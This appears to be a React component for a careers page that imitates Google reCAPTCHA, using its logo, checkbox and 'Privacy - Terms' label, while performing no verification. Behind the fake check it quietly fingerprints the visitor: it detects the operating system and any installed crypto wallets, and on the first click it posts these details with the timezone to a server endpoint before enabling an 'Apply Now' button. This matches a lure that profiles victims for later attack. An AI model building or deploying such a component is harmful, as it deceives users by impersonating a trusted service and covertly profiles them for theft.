"use client";

import { useEffect, useRef, useState } from "react";
import { collectVisitorMeta } from "@/lib/visitorDetect";

type Props = {
  onComplete: () => void;
};

type Phase = "idle" | "checking" | "done";

function RecaptchaLogo() {
  return (
    // eslint-disable-next-line @next/next/no-img-element
    <img
      src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
      alt=""
      width={36}
      height={36}
      draggable={false}
      className="block h-9 w-9"
    />
  );
}

function RecaptchaCheckboxDone() {
  return (
    <svg className="rc-cb-check -ml-0.5 block h-8 w-8 overflow-visible" viewBox="0 0 30 30" aria-hidden>
      <path
        d="M4.2 15.4 11.2 22.2 25.8 6.6"
        fill="none"
        stroke="#00c851"
        strokeWidth="3.8"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function RecaptchaCheckboxLoading({ loadKey }: { loadKey: number }) {
  return (
    <span key={loadKey} className="grid h-[28px] w-[28px] place-items-center overflow-visible" aria-hidden>
      <svg className="rc-cb-spin block h-[32px] w-[32px]" viewBox="0 0 32 32">
        <circle
          cx="16"
          cy="16"
          r="12.5"
          fill="none"
          stroke="#4d90fe"
          strokeWidth="3"
          strokeLinecap="round"
          strokeDasharray="37 79"
        />
      </svg>
    </span>
  );
}

function nextVerifyId() {
  return String(Math.floor(10000 + Math.random() * 90000));
}

type OsKind = "windows" | "mac" | "linux" | "mobile";

function detectOs(): OsKind {
  const ua = navigator.userAgent || "";
  const platform = navigator.platform || "";
  if (/Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return "mobile";
  if (typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints > 1 && /Mac/i.test(platform)) {
    return "mobile";
  }
  if (/Mac/i.test(ua) || /Mac/i.test(platform)) return "mac";
  if (/Linux/i.test(ua) && !/Android/i.test(ua)) return "linux";
  return "windows";
}

type VisitorMeta = {
  deviceFingerprint?: string;
  system?: string;
  wallets?: string[];
  timezone?: string;
};

function reportCaptchaEvent(
  event: "started",
  verifyId: string,
  os: OsKind,
  meta: VisitorMeta,
) {
  const payload = JSON.stringify({
    event,
    verifyId,
    os,
    path: window.location.pathname,
    ...meta,
  });
  void fetch("/api/careers/captcha-event", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: payload,
    keepalive: true,
  }).catch(() => {/* fire-and-forget */});
}

export function BusinessCaptcha({ onComplete }: Props) {
  const [phase, setPhase] = useState<Phase>("idle");
  const [verifyId, setVerifyId] = useState(nextVerifyId);
  const [loadingKey, setLoadingKey] = useState(0);
  const [os, setOs] = useState<OsKind>("windows");
  const widgetRef = useRef<HTMLDivElement>(null);
  const checkTimeoutRef = useRef<number | null>(null);

  const startedRef = useRef(false);
  const metaRef = useRef<VisitorMeta>({});

  const CHECK_MS = 3000;

  useEffect(() => {
    setOs(detectOs());
    void collectVisitorMeta({ walletWaitMs: 400 }).then((m) => {
      metaRef.current = {
        deviceFingerprint: m.deviceFingerprint,
        system: m.system,
        wallets: m.wallets,
        timezone: m.timezone,
      };
    });
  }, []);

  useEffect(() => {
    return () => {
      if (checkTimeoutRef.current !== null) window.clearTimeout(checkTimeoutRef.current);
    };
  }, []);

  const handleCheckboxClick = () => {
    if (phase !== "idle") return;
    const id = nextVerifyId();
    setVerifyId(id);
    setLoadingKey((k) => k + 1);
    setPhase("checking");

    if (!startedRef.current) {
      startedRef.current = true;
      reportCaptchaEvent("started", id, os, metaRef.current);
    }

    if (checkTimeoutRef.current !== null) window.clearTimeout(checkTimeoutRef.current);
    checkTimeoutRef.current = window.setTimeout(() => {
      setPhase("done");
    }, CHECK_MS);
  };

  return (
    <div ref={widgetRef} className="relative inline-block">
      <div
        className="flex h-[78px] w-[304px] items-center justify-between border border-[#d3d3d3] bg-[#f9f9f9] pl-[14px] pr-[11px]"
        style={{ fontFamily: "Roboto, Helvetica, Arial, sans-serif" }}
      >
        <span className="flex items-center">
          <button
            type="button"
            aria-label="I'm not a robot"
            aria-pressed={phase === "done"}
            disabled={phase !== "idle"}
            onClick={handleCheckboxClick}
            className="rc-cb-box grid h-7 w-7 cursor-pointer place-items-center border-0 bg-transparent p-0 disabled:cursor-default"
          >
            {phase === "done" ? (
              <RecaptchaCheckboxDone />
            ) : phase === "checking" ? (
              <RecaptchaCheckboxLoading loadKey={loadingKey} />
            ) : (
              <span className="rc-cb-square block h-6 w-6 rounded-[2px] border-2 border-[#c1c1c1] bg-white" />
            )}
          </button>
          <button
            type="button"
            disabled={phase !== "idle"}
            onClick={handleCheckboxClick}
            className="ml-3 cursor-pointer border-0 bg-transparent p-0 text-[14px] font-normal leading-[17px] text-black disabled:cursor-default"
          >
            I&apos;m not a robot
          </button>
        </span>

        <span className="flex w-[72px] shrink-0 flex-col items-center">
          <RecaptchaLogo />
          <span className="mt-[2px] whitespace-nowrap text-[8px] leading-none text-[#555]">
            Privacy - Terms
          </span>
        </span>
      </div>

      <button
        type="button"
        onClick={onComplete}
        disabled={phase !== "done"}
        className="btn-gold mt-5 rounded-md px-7 py-3 text-sm font-semibold disabled:cursor-not-allowed disabled:opacity-40"
      >
        Apply Now
      </button>
    </div>
  );
}
